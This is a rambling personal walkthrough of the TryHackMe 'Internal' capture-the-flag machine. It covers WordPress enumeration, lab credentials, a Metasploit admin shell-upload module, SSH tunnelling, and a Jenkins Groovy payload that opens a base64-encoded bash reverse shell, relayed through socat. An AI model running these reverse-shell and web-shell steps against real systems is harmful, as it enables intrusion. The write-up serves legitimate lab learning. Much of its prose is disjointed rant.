# Internal Writeup

Name: Internal
Date:  15/5/2024
Difficulty:  Hard
Goals:  
- GLHF on another of TheMayor boxes.. 
Learnt:
- MORE CLI Cool Commands
- Hard of THM is passwords.txt sometimes
Beyond Root:
- Unintend SQL injection to retain Writeup status - CVE is 2022 and box is 2020 and its a Offensive Path box from the TheMayor and the last one was evil. I have spent so much time painfully flailing on this machine. I can only justify do this for completionism
- XCT Windows Privilege Escalation - https://notes.vulndev.io/wiki/redteam/privilege-escalation/windows

- [[Internal-Notes.md]]
- [[Internal-CMD-by-CMDs.md]]

Starting and restarting this Writeup multiple times, this will be the final time. I am already aware the SQL Injection before this attempt. This going in for this final attempt, the this is a TheMayor Box and the last one I did  was not pretty. I almost wanted to run for Senate in the US and filibuster with infinite jibberish out of frustrated madness till I clone myself a proxy to run for Mayor that is more arbitrary and absurd than myself out the mismatch *real* upbringing to oust him... it was a weird and painful experience - [cue battle music to humiliation](https://www.youtube.com/watch?v=ACULtdKEVdY). It made realise I am bad, the box was bad and digging yourself out of the inverse learning curve hole is (and still sort of is continuously going to be a nightmare. Lots of other really like these boxes, but they could all be of CM tribe online surging and back-patting or I just got unlucky with other user trolling me. It could also be that these boxes were before HTB, PG and THM start standardising what a box is actually suppose to be and what the objective actually is with it. Having been blissful unaware of the nerdy-bullshit of nonstrategic-mind-meddling of 3p33n insecurity honeypot-to-fill-the-creator ego for most of my life, the rude awaking to that kind of bullshit that does not exist outside of most *hardcore* Video Games, Specific subculture-forums and Cartoon-Cults. Internally I am *hoping* this will 3 hours maximum.  I live and cope. The beyond root for this is just finishing this. 
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Internal/Screenshots/ping.png)

On port 80 it is just another....
![](justAnotherWPsite.png)

... Wordpress site, so using `wpscan` with the free API key while help enumerate the low to middle hang potential attack vector fruits.
```bash
wpscan --url $url --rua -e --api-token $APIKEY -o zeroauth.wpscan
```

SecLists also has wordlists to try, although they might be old 
```bash
/usr/share/wordlists/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
/usr/share/wordlists/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
```

Short cutting to enumerating just one vulnerability - replaced the original I did with -B 
![](shortcuttoenumeverything.png)
One day I hope the Offensive Security Web App Cert just understand how anyone is suppose to do the job that get for a job does what they do in a week. Tiber1ous and the like boggle my brain sometimes. Grep all the potential vulnerabilities found by `wpscan` and when each was fixed:
```bash
cat zeroauth.wpscan | grep 'Title' -A 1
```

Hostname in the source
![](domaininthesrcbut.png)

Another weirdness to this machine is this first of many hundreds of box that `gospider` did not work
![](nospider.png)
and with the hostname:
![](nodomainspider.png)

Terrapin BR?
![](nucleinoetags.png)

The default, is actual `admin`; I for some reason thought it was `wp-admin`, but I leave this here as reminder of my mistake...
> WHY WOULD YOU MAKE ANOTHER ADMINISTRATIVE USER IN WORDPRESS IT GOES AGAINST THE TIERING OF ADMINISTRATIVE ACCOUNTS ITS MADNESS.
 Another `admin`  user - [[CVE-2017-5487-http___internal.thm_wordpress__rest_route=_wp_v2_users_-.md]]
> WHY WOULD YOU MAKE ANOTHER ADMINISTRATIVE USER IN WORDPRESS IT GOES AGAINST THE TIERING OF ADMINISTRATIVE ACCOUNTS ITS MADNESS.

Apparently some people make their own Administrator account with less guessable names, which is not a good solution:
1. Introduces custom permissions misconfigurations
2. Vulnerabilities exist 
3. Enumeration of usernames exists via errors on brute forcing
4. Changing the username could additive profiling information about the administrator that could be used at a later stage

A better would just be have long strong password, MFA apps and if you are really concerned alerting on failed login after 3 attempts. Then worry about getting a SOC... If you needed to be very special:
- Copy the permissions of the default to a new user that is just MD5 hash for the name, with all the security suggestions above
- Remove all the permissions of the default administrative user
- Add an alert whenever the default admin logs in and use it as a honeypot admin account.

Regardless, version verification is the current objective, either from:
- Forcing SQL Errors on `WP_Query` or `WP_Meta_Query` 
- Deductive, Abductive, .Inductive reasoning 
- Version indicator on the website - HackTricks.

`SE-dork:`  `wordpress 6.0.3` depending on whether that feature was released prior to 2022.

- https://en.wikipedia.org/wiki/Deductive_reasoning

![](wpversion603releasedate.png)


1. Version
2. Guess the probable SQL query
3. Force an error 

First stop [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) Wordpress. Wordpress Version `/license.txt` or `/readme.html`, there is a nuclei template I got jebaited by my brainlessness brain almost into actually be able to contribute to something.

![](exactWordpressVerson.png)

Get WordPress Version
```bash
curl https://$victim.tld/$wordpress | grep 'content="WordPress'
```

Given the latest of these CVEs I am going to assume this is not the intended path.
![](542islessthanall.png)

https://www.redhat.com/sysadmin/formatting-date-command
```bash
date --date="5 year ago"
date --date="1360 day ago"
```
Perspective.. 
![](dateDATEDATES.png)

```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

## Exploit

For the spoiler as a bypassing the insult of wasting your time reading this and moving on with your life.
![](my2boys.png)

#### Intended Path to avoid waste even more time on these *special* boxes

After the agonising over 24 hour plus allegorical prometheus's feculent vomiting the stones of barbed-wired wrapped molten glass of the [[Relevant-WTFisTHIS]] machine and the unintended paths, intended paths of Internal. I decided at the SQL injection being from 2022 and this box being 2020 based and prior to view the official Writeup for the intended path to at least have more streamlined painful couple of hours trying to get the unintended way of get the admin and or the wp-admin (mistake: admin) users password through the SQL injection. Unfortunately I cannot do the *official* way or follow what the official walkthrough, because reasons. 
![](gatekeepage.png)

I understand to some this is the ultimate opportunity for me to shart another away 24-48 hours. Learning nothing, gaining nothing and doing very, very little that is relevant to the modern world. There are better networks and boxes for the "Pre-engagement Briefing". At least given my lack capability. Please tell me the real world were this makes any sense both to implement as security and CTF. 
![](nmapudpforthewhy.png)

The scars on my brain of doing the [[Relevant-WTFisTHIS]] machine still hurt. Once I actually have some actually credibility of any kind, as TheMayor actually does this for a Job I think in addition to whatever I contribute I will use AI to scrap all these to figure out for other whether these old machine actually were worth doing for others:
- i.e. You must do this no hints, or this contains  bullshit that is of its time like racism or homophobia, use a guide for X part you will not learn anything but that this arsehole has either a big following, ego this box is just not supported like more modern HTB boxes.

The preemptive counter argument here is: Video Game Industry has had shovelware, untested nonsense for decades - why are you replicating the same rubbish for clout and get you by in one job interview?

Quality control exists to actually make us better as why use a platform if the curation is so bad that there is not a warning about this. A discord channel and community doing your work is not a solution. This the exact reason the same idiots are worrying that AI will take their security jobs. Commitment. 

Why would I not search engine dork something like this before writing it down...

This was me being WRONG:
> WHY WOULD YOU MAKE ANOTHER ADMINISTRATIVE USER IN WORDPRESS IT GOES AGAINST THE TIERING OF ADMINISTRATIVE ACCOUNTS ITS MADNESS.

https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd. 
![](thankyou.png)
How is this hard? [[Relevant-WTFisTHIS]] was hard for weird reasons. Due diligence...and due to the experience of both of these boxes - I like I how I am got recommended videos and adverts that may read and the assume I am the issue. I spent more time trying these the the developer that programmed that algorithm did to push corporate surveillance  for market dominance did on this machine. My ego is very small, my hope being that this make an affect to terrible recommendations. So after I had ranted at myself at the State of the West, Cultures, Conflicts of the day, Corporations failing even while being successful. I decided it best to parallel the issues with how I learnt and changed in contrast to the rest of the world. I know this the real systemic problem for world and I. I am reminded of many my past cynical perspectives, views and knowing how things would play out in the world, the futility of knowing the people(s) chose *this* with all the technology and capability and inventiveness to do so to ultimately fail to dominate in this world. I put it down to the greed of the power hungry to de-optimise the entire system, all our generation best decision maker are playing or larping around in difficult Video Games. The irony is hilariously sad state of humanity and its systems the UI is being made bad by the nepotistic decadence inherent in any system with humans not trying to comply with neutrality for algorithmic optimisation. And yet here I am humiliating myself to reach a more meta point about the direction of me (while still trying to retain the small ego part) just trying to make a better life for myself than care about the world, humanity or imperfect systems. Its not problem of new or old strategy its just a character-of-how-we-get-there problem. We need a unified truth on the best path, its costs and its rewards. 
- Neutrality as collective compliance for algorithmic optimisations: what is best for the system not for my family or friends or person that SE-ed; the system should be inherently valuable to be investing time in. Governments protect and grow population to survive; corrupt governments are inefficient except in being more of a particular type of accepted corruption.  
- If I monopolise my time without growing and cultivating novelty, I am not adapting like nature does
- If dogmatically pursue self enforced predestination by perspective without surrendering to change I waste time 
- If I am honest and use proofs instead opinion and guise then at the least the environment offence kneels to my acquired might through neural work. 
- If do not pay the price or sacrifice to adapt I will never endure
- If my interest is in the short term the inflation in the long term is greater - cheating yourself 
- Nietzsche's Decadence start at the human level of self-control, but is manifest by the systems hierarchically dominion greater than the individual.   

Sometimes I amazing myself at my own patience. The laws of nature and the universe are so evident yet its ourselves and our systems not the technology that is the issue. Except with something like LLM were we just trust the AI, but I am most certain is novel.

So to return to the point writing more of CTF related content. The reason why I do this is the same reason that the rich want to go space, it is a way to find new technology that works this is just cheaper and good for the brain. I written down multiple times *"well I focused on the idea of SQL because the 3 other times trying this I came to this conclusion and that seemed to line up with the versioning, difficulty of box and I should learn more SQL because failing to do this is frustrating and I do not have mentors or a job doing this...."* 

Piece and puzzles and the differences on realism or difficulty or puzzle-y type of boxes is ... pain when in this situation. It is so bad I am starting to talk other people activities... This has left me with a lot of life and wtftodowiththeworld-kind of questions.

![](my2boys.png)
```
admin : my2boys
```


Queue the angry Scarlet Johanssen walk from Ghost in the Shell... I will at least feel as good web shelling this machine for the probably easy PrivEsc like [Aramaki Shoot out](https://www.youtube.com/watch?v=TRS4tYeeouA) and turn the moral upside-down on the hourglass of hacking-moral. How wrong I would end up being. One day I will get good at this... but if I need to do more angry Scarlet Johanssen walking... I find the walk very funny for uncanny-valley-human-augmented-killing-machine-as-a-stompy-child reasons...
![](wptooktheoffense.png)
Well....another restart later after I did not read the email is correct WHAT
![](thmcomplianceasaprotest.png)

At this point I the hilarious absurd timelords-dodging-the-genocide-the-universe-inquiry final Dr Who episode ever in 6969 come to mind. At email is correct nonsense. Level of triggering and upsetting for all involved. Second restart:
![](bypassthis.png)

Well nothing is working for me these days, because the same old external issues, but regardless it is all worth it.
![](strengthofEMAILS.png)
It is times like these were I am reminded of the corrupting influence of the dragon of mars in 40k. I will finish my echoesofthemahcinegod rust convert a play a base64 version of Children of the Omnissiah. My hope is to after I final figure how to actually write rust to try huffman encoding it.
![](putinlogsintowp.png)

Another reminder to go passwordless by 2025!
![](passwordlessby2025.png)

All data at rest or in-transit is just like those cool Japanese restaurants with horizontal food escalators, more food, more passwords, more flags, more flags more lessons etched like the tired marks of your head stuck in the escalators. William even writes his passwords done like he is writing the pastebin dump:

```
william:arnold147
```
These credentials were not useful as far as I can make out.

[Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb) - for the later BR on Windows Defender for one of these old machine.
![](showingmyage.png)

Shells if we need any
```bash
# You can reverse shell by editing templates (404.php, footer.php...)
# Theme Editor use a 404 template as it won't break the site.
# Plugin Editor  then go to /wp-content/plugins/<pluginname.php>
# Beware Theme must be active 
/usr/share/wordlists/seclists/Web-Shells/WordPress
/usr/share/wordlists/Web-Shells/laudanum-1.0/wordpress/templates/shell.php
```
![](updateingthe20sometyhingplugin.png)

Minor improvements from https://www.hackingarticles.in/wordpress-reverse-shell/
```
msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload'
set RHOST internal.thm
set USERNAME admin
set PASSWORD my2boys 
set targeturi /wordpress
exploit
```

```php
/wordpress/wp-content/themes/twentyfifteen/404.php
```

Two restarts and mistakes in a laboratory environment is not, but the login screen is still the lavatory flushing away my time.
![](arnold147isnotthesshpassword.png)

Better for everyone doing this box in the future
- Do not `Press remind my later` or `This is my email`
- press `update`

## Foothold

Re-leafing the tree of trump with a health dose of relief 
![](reLEAFtheTREEOFtrump.png)

![](aubreanna.png)
## Privilege Escalation

Atleast it is not a GTFObin
![](noaubreannainthewpdatabase.png)

The temptation to pwnkit this machine is quite real. And I try and ruined the potentially without another painful restart. Do not worry another fly WTF moment again.
![](optdirectory.png)

Thought nginx was runner on localhost 8080, but it is Jenkins
![](jenkins.png)

But Jenkins is being run by aubreanna,  but there maybe some credentials seem to be the pattern of this box... I need practice with chisel and socat for shell relaying so instead the more OPSEC ssh Dynamic port forward.

For the SSH Local Dynamic Proxy - we initiate the command from kali to tell the client bind localhost 9000 to the connection made to the SSH server of Internal.thm.
![](sshremotereversedynamicproxy.png)
We then configure proxy chains to socks4 at the localhost 9000.
```
ssh -N -D 127.0.0.1:9000 aubreanna@10.10.52.103
```

After deliberation over the next 2 weeks scheduled to fix my cheatsheets on Chisel, SSH tunneling and Socat and other alternatives. I am planning doing Dante in June so that needs to correct.

https://en.wikipedia.org/wiki/Jenkins_(software)

![](opsecwayiseasierwaythiswayforwebroot.png)
```
admin : admin
jenkins : jenkins
```

While I ran through proxychains nulcei and nmap, linpeas as aubreanna

Both docker and containerd are on the box in /opt and normal docker installation, both are root controlled, no debug or listing, etc for containers so I need to get into container so be root on the container to mount back as root on internal host box.
![](noprivcontainers.png)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
She is part of the plugdev and adm and dip group
- dial up 
- mount with nodev and nosuid umount removable device (maybe containers) through `pmount`
- read many log files in /var/log, and can use xconsole

```
admin : 
jenkins :
aubreanna : bubb13guM!@#123

admin : my2boys
william : arnold147

```

HackTricks Brazil hosts Jenkins pages for some reason

![](msfauxmodule.png)


![](noexecution.png)

![](nojenkinsexploitfromsearchsploit.png)

https://github.com/gquere/pwn_jenkins

No jenkins_home or share directory?
![](wtfisthevardirectorywhenshareinsidenoexistbutaprocesswhat.png)

[SPONGE BOBBLE](https://www.youtube.com/watch?v=5JTZbGOG91Y) - Love the way the Voice Actor says this.
![](SPONGEBOBBLE.png)

Proxy the reverse shell back through `socat` on the Internal host
![](nowtogrooveyreverseshell.png)

https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins
```java
// bash -c 'bash -i >& /dev/tcp/172.17.0.1/10000 0>&1'

def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEwMDAwIDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000000000000)
println "out> $sout err> $serr"
```
[waitForOrKill - Groovey Documentation](https://docs.groovy-lang.org/2.4.0/html/api/org/codehaus/groovy/runtime/ProcessGroovyMethods.html#waitForOrKill(java.lang.Process,%20long)) *"Wait for the process to finish during a certain amount of time, otherwise stops the process....the number of milliseconds to wait before stopping the process!!"*

Socat Relay back to our box for style points, rather than use `nc` in ssh session
```
nohup socat TCP-LISTEN:10000,reuseaddr,fork,range=172.17.0.1/24 TCP:10.11.3.193:8443 &
```


![](wearejenkins.png)

![](rootpasswordinthenotes.png)

...
![](wtfwasthisbox.png)
Ok....

## Post-Root-Reflection  

My *"House"* motto - In time.. there is truth

Funny GOT hacking related house mottos
- "admin : password"
- "It's always DNS"
- "I RTFM"
- I use Arch BTW
- "dash S C and dash S V for default scripts"
- My knee-high socks as large as rc files
## Beyond Root

Deductive Reasoning - [Wikipedia](https://en.wikipedia.org/wiki/Deductive_reasoning) *"is the process of drawing valid [inferences](https://en.wikipedia.org/wiki/Inference "Inference"). An inference is [valid](https://en.wikipedia.org/wiki/Validity_(logic) "Validity (logic)") if its conclusion follows logically from its [premises](https://en.wikipedia.org/wiki/Premise "Premise"), meaning that it is impossible for the premises to be true and the conclusion to be false."*; 
```c
type Premise struct {
	[]char subPremises
}

int inference = -1;
int lenSP = sizeof(subPremises)-1
int allSubpremises = 0;
bool test = false;
for ; i <= lenSP; i++ { 
	test = isSubpremiseTrue();
	if test {
		allSubpremises++;
		test = false;
	} 
}

if allSubpremises != lenSP {
	// Inference is False
} else {
	// Inference is True
}
```


Abductive Reasoning - [Wikipedia](https://en.wikipedia.org/wiki/Abductive_reasoning) *"is a form of logical inference that seeks the simplest and most likely conclusion from a set of observations. It was formulated and advanced by American philosopher and logician Charles Sanders Peirce beginning in the latter half of the 19th century."*
```c
type Conclusion struct {
	int simplicity 
	float possiblity 
} 
// for x,y,z being initialised Conclusions and assigned in shorthand, not proper C
allConclusions = []*Conclusion{x,y,z};
searchForMostSinmplyAndMostLikely(allConclusions);
```


Inductive Reasoning - [Wikipedia](https://en.wikipedia.org/wiki/Inductive_reasoning) - **Not** *"[mathematical induction](https://en.wikipedia.org/wiki/Mathematical_induction "Mathematical induction"), which is actually a form of deductive* reasoning and is actually *"is any of various [methods of reasoning](https://en.wikipedia.org/wiki/Method_of_reasoning "Method of reasoning") in which broad generalizations or [principles](https://en.wikipedia.org/wiki/Principle "Principle") are derived from a body of observations.[](https://en.wikipedia.org/wiki/Inductive_reasoning#cite_note-1)"*
```c
generalizations, principles = inductiveReasoning(observations); 
```

#### Unintended Web access path

Unintended SQLi is possible and I want do to retain Writeup status of this box I would really like to do one of the SQL injections myself and Rule of Acquisition number 17 is a contract is a contract is a contract - but only between ferengi. And hacker without flags is no hacker at all. Quality of the flags and should be subject to the same scrutiny written above, terms and your attention is mine on the condition that I even succeed. Lmao. Added The Rules of Hackquisition as a Beyond Root Todo.

```bash
# Does require another sed command to remove the ` ^[[31m^[[0m ` unless you copy from post-stdout  
cat zeroauth.wpscan | grep SQL -A 1 | sed 's/ | //g' | sed 's/--//g' | sed 's@\[!\]@@g'
```

Dork  `-Internal` each of these 

> Title: WordPress < 5.8.3 - SQL Injection via WP_Query 
	 Fixed in: 5.4.9
	 CVE-2022-21661

https://www.exploit-db.com/exploits/50663

- Find an action=FUZZ

 > Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
    Fixed in: 5.4.9
    CVE-2022-21664

 > Title: WP < 6.0.2 - SQLi via Link API
    Fixed in: 5.4.11

 > Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
    Fixed in: 5.4.12

 > Title: WP < 6.0.3 - SQLi in WP_Date_Query
    Fixed in: 5.4.12



https://developer.wordpress.org/reference/classes/wp_query/
```php
// wp-includes/class-wp-query.php
<?php
// The Query.
$the_query = new WP_Query( $args );

// The Loop.
if ( $the_query->have_posts() ) {
	echo '<ul>';
	while ( $the_query->have_posts() ) {
		$the_query->the_post();
		echo '<li>' . esc_html( get_the_title() ) . '</li>';
	}
	echo '</ul>';
} else {
	esc_html_e( 'Sorry, no posts matched your criteria.' );
}
// Restore original Post Data.
wp_reset_postdata();
// ... no closing on the page `?`+`>`
```
Searches for posts 

https://developer.wordpress.org/reference/classes/wp_meta_query/
![](actuallyhassqlrelatedinformationinthedocumentation.png)

*[WP_Meta_Query](https://developer.wordpress.org/reference/classes/wp_meta_query/) is a class defined in wp-includes/meta.php that generates the necessary SQL for meta-related queries. It was introduced in Version 3.2.0 and greatly improved the possibility to query posts by custom fields. In the WP core, it’s used in the [WP_Query](https://developer.wordpress.org/reference/classes/wp_query/ "Class Reference/WP Query") and [WP_User_Query](https://developer.wordpress.org/reference/classes/wp_user_query/ "Class Reference/WP User Query") classes, and since Version 3.5 in the [WP_Comment_Query](https://developer.wordpress.org/reference/classes/wp_comment_query/ "Class Reference/WP Comment Query") class. Unless you’re writing a custom SQL query, you should look in the *Custom Field Parameters* section for the corresponding class.*

1. Which parameter is used to pass the input to the `WP_Meta_Query` method?
2. Guess the SQL syntax game
3. Create an error
4. Wordpress database has a `wp_users` table to read


```sql
select * from wp_users;
/* Till we see admin $shahash *\
```

